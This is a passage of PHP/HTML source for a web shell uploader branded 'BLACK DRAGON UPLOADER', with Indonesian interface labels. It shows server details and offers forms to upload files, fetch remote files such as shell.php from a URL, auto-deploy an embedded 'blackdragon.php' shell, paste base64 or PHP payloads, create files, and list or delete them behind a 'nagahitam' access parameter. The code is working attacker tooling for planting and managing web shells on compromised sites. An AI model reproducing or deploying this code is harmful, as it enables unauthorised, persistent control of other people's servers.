        color:#eee; outline:none; font-family:monospace; font-size:12px; }
    textarea { min-height:220px; }
    input:focus, textarea:focus { border-color:#9333ea; }
    button { padding:10px 20px; background:linear-gradient(90deg,#7c3aed,#a855f7); color:#fff;
             border:0; border-radius:6px; font-weight:700; cursor:pointer; margin-top:6px; }
    button:hover { filter:brightness(1.15); }
    .res { padding:12px; border:1px solid #3a2a4d; border-radius:8px; margin-bottom:16px;
           background:rgba(5,5,10,.7); font-size:13px; }
    .logout { text-align:center; margin-top:20px; }
    .logout a { color:#f472b6; text-decoration:none; font-size:12px; }
    .filelist { width:100%; border-collapse:collapse; font-size:12px; }
    .filelist td, .filelist th { padding:6px 8px; border-bottom:1px solid #3a2a4d; text-align:left; }
    .filelist a { color:#d8b4fe; text-decoration:none; }
    .small { font-size:11px; color:#77778c; }
    </style>
</head>
<body>
<div class="container">
    <div class="bd-logo">&#9650; BLACK DRAGON UPLOADER &#9650;</div>
    <div class="bd-info">server: <?php echo @php_uname(); ?> | php <?php echo PHP_VERSION; ?>
        | dir: <?php echo htmlspecialchars($BDir); ?></div>

    <?php if ($result !== ''): ?>
    <div class="res"><?php echo $result; ?></div>
    <?php endif; ?>

    <!-- 1. Upload Manual -->
    <div class="section">
        <h3>&#128193; Upload Manual (otomatis deteksi BD PACK)</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload">
            <button type="submit">Upload File</button>
        </form>
    </div>

    <!-- 2. Ambil dari URL -->
    <div class="section">
        <h3>&#128279; Ambil dari URL</h3>
        <form method="post">
            <input type="text" name="url_src" placeholder="URL file (https://example.com/shell.php)">
            <input type="text" name="url_name" placeholder="Simpan sebagai (opsional)">
            <button type="submit">Fetch &amp; Save</button>
        </form>
    </div>

    <!-- 3. Auto-deploy blackdragon -->
    <div class="section">
        <h3>&#9650; Auto-Deploy BLACK DRAGON (embedded)</h3>
        <form method="post">
            <input type="text" name="shell_name" placeholder="Nama file (default: blackdragon.php)">
            <button type="submit" name="auto_deploy" value="1">Deploy Shell</button>
        </form>
        <p class="small">Tulis blackdragon.php langsung dari source yang sudah tertanam di uploader ini.</p>
    </div>

    <!-- 4. Tempel & Deploy -->
    <div class="section">
        <h3>&#9999; Tempel &amp; Deploy (BD PACK / source PHP / base64)</h3>
        <form method="post">
            <input type="text" name="paste_name" placeholder="Nama file (default: blackdragon.php)">
            <textarea name="paste_data" placeholder="Paste isi BD PACK, source PHP, atau base64 di sini..."></textarea>
            <label class="small"><input type="checkbox" name="paste_b64" value="1" style="width:auto"> input berupa base64</label>
            <br><button type="submit">Deploy</button>
        </form>
    </div>

    <!-- 5. Isi File Baru -->
    <div class="section">
        <h3>&#9997; Isi File Baru (create)</h3>
        <form method="post">
            <input type="text" name="new_file_name" placeholder="Nama file baru (contoh: shell.php)">
            <textarea name="new_file_content" placeholder="Isi file..."></textarea>
            <button type="submit">Buat File</button>
        </form>
    </div>

    <!-- 6. Daftar file -->
    <div class="section">
        <h3>&#128193; Daftar File</h3>
        <?php
        $files = @scandir($BDir);
        if ($files) {
            echo '<table class="filelist"><tr><th>Nama</th><th>Ukuran</th><th>Aksi</th></tr>';
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') { continue; }
                $p = $BDir . '/' . $f;
                if (is_dir($p)) { continue; }
                $sz = @filesize($p);
                $link = bdUpSelfUrl() . '/' . rawurlencode($f);
                echo '<tr><td><a href="' . htmlspecialchars($link) . '?nagahitam" target="_blank">'
                   . htmlspecialchars($f) . '</a></td><td>' . $sz . '</td>'
                   . '<td><form method="post" style="display:inline"><input type="hidden" name="del_file" value="'
                   . htmlspecialchars($f) . '"><button type="submit" style="padding:3px 10px">Hapus</button></form></td></tr>';
            }
            echo '</table>';
        } else {
            echo '<p class="small">Tidak bisa membaca direktori.</p>';
        }
        ?>
    </div>

    <div class="logout"><a href="?nagahitam&logout">logout</a></div>
</div>
</body>
</html>
